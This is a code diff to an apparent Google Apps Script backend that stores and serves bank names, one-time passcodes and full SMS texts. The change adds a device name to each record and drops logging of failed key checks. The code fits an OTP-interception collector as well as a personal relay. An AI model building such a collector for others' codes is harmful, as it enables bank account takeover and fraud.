@@ -22,11 +22,8 @@ function isAuthorized(params) {
     logError("Auth", "CRITICAL: API_KEY Script Property is not set. All requests blocked.");
     return false;
   }
-  if (!params.api_key || params.api_key !== API_KEY) {
-    logInfo("Auth_FAIL", "Unauthorized attempt. Key prefix: " + String(params.api_key || "none").slice(0, 4) + "...");
-    return false;
-  }
-  return true;
+  var key = params.api_key;
+  return key === API_KEY;
 }
 
 // --- ENHANCED LOGGING ENGINE ---
@@ -105,18 +102,20 @@ function handleSaveOtp(params) {
   var sheet = ss.getSheetByName(OTPS_SHEET_NAME) || ss.insertSheet(OTPS_SHEET_NAME);
 
   if (sheet.getLastRow() === 0) {
-    sheet.appendRow(["timestamp", "bank_name", "otp_code", "full_message"]);
+    sheet.appendRow(["timestamp", "bank_name", "otp_code", "full_message", "device_name"]);
   }
 
   var bankName = params.bank_name;
   var otpCode = params.otp_code;
   var fullMessage = params.full_message;
+  var deviceName = params.device_name || "Unknown";
 
   sheet.appendRow([
     new Date().toISOString(),
     bankName,
     otpCode,
-    fullMessage
+    fullMessage,
+    deviceName
   ]);
 
   return { success: true };
@@ -150,7 +149,8 @@ function handleFetchData(params) {
         "timestamp": otpData[j][0],
         "bank_name": otpData[j][1],
         "otp_code": otpData[j][2],
-        "full_message": otpData[j][3]
+        "full_message": otpData[j][3],
+        "device_name": otpData[j][4] || "Unknown"
       });
       count++;
     }
